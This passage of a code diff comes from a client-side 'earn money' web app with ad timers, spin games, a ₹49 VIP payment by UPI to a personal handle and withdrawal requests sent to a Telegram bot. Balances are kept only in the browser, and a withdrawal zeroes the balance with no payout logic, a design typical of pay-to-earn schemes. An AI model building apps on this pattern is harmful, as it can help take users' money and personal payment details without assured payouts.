 function startSpin(body){body.innerHTML='<div style="padding:20px;text-align:center"><div style="font-size:64px">🎡</div><button class="btn btn-primary mt-4" style="padding:16px 32px;font-size:18px" onclick="doSpin()">SPIN!</button><div id="spinRes" class="mt-3 font-bold"></div></div>';window.doSpin=()=>{let res=Math.floor(Math.random()*5);if(res>0){document.getElementById('spinRes').innerText='🎉 Win!';winGame();}else{document.getElementById('spinRes').innerText='😭 Try Again!';}};}
 function openExtraAd(){var ed=parseInt(S_get('extra_ad_done','0')||'0');if(ed>=10 && !isVip){if(confirm("Daily 10 Over! VIP?")){openVip();}return;}if(ed>=30){toast('Daily 30 Over!');return}var modal=document.createElement('div');modal.style='position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:999;display:flex;align-items:center;justify-content:center';modal.innerHTML='<div style="background:#fff;padding:20px;border-radius:16px;text-align:center;max-width:300px"><div style="font-size:28px;font-weight:800;color:#4f46e5" id="extraTimer">15</div><div>Extra Ad - 15 Sec!</div></div>';document.body.appendChild(modal);var t=15;var iv=setInterval(function(){t--;var el=document.getElementById('extraTimer');if(el)el.innerText=t;if(t<=0){clearInterval(iv);modal.remove();var amt=isVip?0.40:0.10;bal+=amt;todayEarn+=amt;ed++;S_set('extra_ad_done',ed.toString());saveBal();updateUI();toast('✅ +₹'+amt);try{window.open('https://araplhn.org/4/69486a0ba85e1ba54d445e63ddcb5c27','_blank');}catch(e){}}},1000);}
 function openVip(){document.getElementById('vipModal').classList.remove('hidden');document.getElementById('vipModal').style.display='flex';}
 function closeVip(){document.getElementById('vipModal').classList.add('hidden');document.getElementById('vipModal').style.display='none';}
-function buyVip(){var upi='dinesh@upi';var url='upi://pay?pa='+encodeURIComponent(upi)+'&pn=SalemEarnProVIP&am=49&cu=INR&tn=VIP';window.location.href=url;let userId=S_get('proplay_userid','PRO'+Date.now().toString().slice(-6));let msg=`👑 NEW VIP PURCHASE!\n\nUser ID: ${userId}\nBalance: ₹${bal.toFixed(2)}\nTime: ${new Date().toLocaleString('en-IN')}\nUPI: ${upi}`;sendTelegramMsg(msg);setTimeout(function(){if(confirm('Payment Done?')){toast('✅ VIP Request Sent!');}},2000);}
-function withdraw(){let upi=document.getElementById('upiId').value.trim();if(!upi.includes('@')){toast('Enter Valid UPI!');return;}if(bal<100){toast('Min ₹100 Needed! Have ₹'+bal.toFixed(2));return;}let userId=S_get('proplay_userid','PRO'+Date.now().toString().slice(-6));let msg=`💸 WITHDRAWAL REQUEST!\n\nUser ID: ${userId}\nUPI: ${upi}\nAmount: ₹${bal.toFixed(2)}\nGames: ${gamesPlayed}\nTime: ${new Date().toLocaleString('en-IN')}`;sendTelegramMsg(msg);toast('✅ Withdraw Sent to Admin!');let h=document.getElementById('hist');h.innerHTML='<div>✅ ₹'+bal.toFixed(2)+' to '+upi+' - Pending</div>'+h.innerHTML;bal=0;saveBal();updateUI();}
-function sendSupport(){let name=document.getElementById('supName').value.trim();let msgText=document.getElementById('supMsg').value.trim();if(!name || !msgText){toast('Name & Message Enter!');return;}let userId=S_get('proplay_userid','PRO'+Date.now().toString().slice(-6));let fullMsg=`💬 SUPPORT!\n\nUser ID: ${userId}\nName: ${name}\nBalance: ₹${bal.toFixed(2)}\nVIP: ${isVip?'Yes':'No'}\nMsg: ${msgText}\nTime: ${new Date().toLocaleString('en-IN')}`;sendTelegramMsg(fullMsg);document.getElementById('supMsg').value='';}
-// BUG FIX - DAILY 1 TIME ONLY - VIDEO BUG FIXED!
-function claimTask(type){
- let today = new Date().toDateString();
- if(type==='g5'){
-  let lastClaim = S_get('task_g5_date','');
-  if(lastClaim === today){ toast('Already Claimed Today! Play Tomorrow!'); return; }
-  if(gamesPlayed>=5){
-   bal+=2; todayEarn+=2; gamesPlayed=0;
-   S_set('proplay_gp','0');
-   S_set('task_g5_date',today);
-   saveBal(); updateUI(); toast('✅ ₹2 Claimed! Daily Limit Done!');
-  } else toast('Play '+(5-gamesPlayed)+' more Games!');
- }
- if(type==='e5'){
-  let lastClaim2 = S_get('task_e5_date','');
-  if(lastClaim2 === today){ toast('Already Claimed Today!'); return; }
-  var ed=parseInt(S_get('extra_ad_done','0')||'0');
-  if(ed>=5){
-   bal+=1; todayEarn+=1;
-   S_set('task_e5_date',today);
-   saveBal(); updateUI(); toast('✅ ₹1 Claimed! Daily Limit Done!');
-  } else toast('Watch '+(5-ed)+' more Ads!');
- }
+function buyVip(){var upi='p.dinesh01@ptyes';var url='upi://pay?pa='+encodeURIComponent(upi)+'&pn=SalemEarnProVIP&am=49&cu=INR&tn=VIP49';window.location.href=url;let userId=S_get('proplay_userid','PRO'+Date.now().toString().slice(-6));let msg=`👑 NEW VIP PURCHASE REQUEST!\n\nUser ID: ${userId}\nUPI: ${upi}\nAmount: ₹49\nBalance: ₹${bal.toFixed(2)}\nGames: ${gamesPlayed}\nTime: ${new Date().toLocaleString('en-IN')}\n\nCheck GPay - ₹49 Received?\nIf Yes - Approve in Admin Panel - Auto Active!`;sendTelegramMsg(msg);setTimeout(function(){toast('✅ Request Sent! Pay ₹49 then click Verify Payment! Admin approve panna auto active aagum!');},1500);}
+function verifyPayment(){
+ let userId=S_get('proplay_userid','PRO'+Date.now().toString().slice(-6));
+ let statusDiv=document.getElementById('vipStatus');
+ statusDiv.classList.remove('hidden');
+ statusDiv.innerText=`⏳ Checking Approval for ${userId}... Admin approve panna 10 sec la auto VIP aagum!`;
+ sendTelegramMsg(`🔍 USER VERIFY CLICKED!\nUser ID: ${userId}\nBalance: ₹${bal.toFixed(2)}\nTime: ${new Date().toLocaleString('en-IN')}\nPlease Approve in Admin Panel!`);
+ checkAutoApproval(true);
+ toast('⏳ Verifying... Wait 10 sec!');
 }
-function copyRef(){let i=document.getElementById('refLink');i.select();document.execCommand('copy');toast('✅ Copied!');}
-function shareRef(){let l=document.getElementById('refLink').value;let t='Join Salem Earn Pro - '+l;window.open('https://wa.me/?text='+encodeURIComponent(t),'_blank');}
-updateUI();renderGames();
-if(!S_get('proplay_userid','')){S_set('proplay_userid','PRO'+Date.now().toString().slice(-6));}
-</script></body></html>
+function checkAutoApproval(showToast=false){
+ let myId=S_get('proplay_userid','');
+ if(!myId || !NPOINT_URL.includes('npoint.io')){ if(showToast) toast('Admin NPoint not set!'); return; }
+ fetch(NPOINT_URL).then(r=>r.json()).then(data=>{
+   let vipList=data.vip||[]; let refList=data.ref||[];
+   let vipEntry=vipList.find(v=> (typeof v==='string'?v===myId : v.id===myId));
+   if(vipEntry){
+     let expiry = typeof vipEntry==='object' ? vipEntry.expiry : 0;
+     if(expiry && Date.now() > expiry){
+       S_set('proplay_vip','0'); isVip=false; saveBal(); updateUI();
+       toast('⚠️ VIP Expired! 30 Days Over! Renew!');
+       return;
+     }
+     if(!isVip){
+       S_set('proplay_vip','1'); isVip=true;
+       let exp = typeof vipEntry==='object' && vipEntry.expiry ? vipEntry.expiry : Date.now()+30*24*60*60*1000;
+       S_set('vip_expiry', exp.toString());
+       saveBal(); updateUI();
+       toast('👑 VIP Auto Approved! 30 Days Active!');
+       let st=document.getElementById('vipStatus'); if(st){ st.classList.remove('hidden'); st.innerText=`✅ VIP Approved! Expiry: ${new Date(exp).toLocaleDateString()}`; }
+       sendTelegramMsg(`✅ AUTO VIP ACTIVATED!\nUser ID: ${myId}\nTime: ${new Date().toLocaleString('en-IN')}`);
+     }
+   } else {
+     if(showToast) toast('⏳ Not yet approved - Admin 2 mins la approve pannuvanga!');
+   }
+   let refEntry=refList.find(r=> (typeof r==='string'?r===myId : r.id===myId));
+   if(refEntry && !S_get('ref_bonus_'+myId,'')){
+     bal+=10; refEarn+=10; refCount++; S_set('proplay_rc',refCount.toString()); saveBal(); updateUI();
+     S_set('ref_bonus_'+myId,'1');
+     toast('✅ Referral Bonus ₹10 Auto Added!');
+   }
+ }).catch(e=>{ if(showToast) toast('Check failed - Try again!'); });
+}
+function checkVipExpiry(){
+ let vipExp = parseInt(S_get('vip_expiry','0')||'0');
+ if(isVip && vipExp && Date.now() > vipExp){
+   S_set('proplay_vip','0'); isVip=false; saveBal(); updateUI();
+   toast('⚠️ VIP Expired
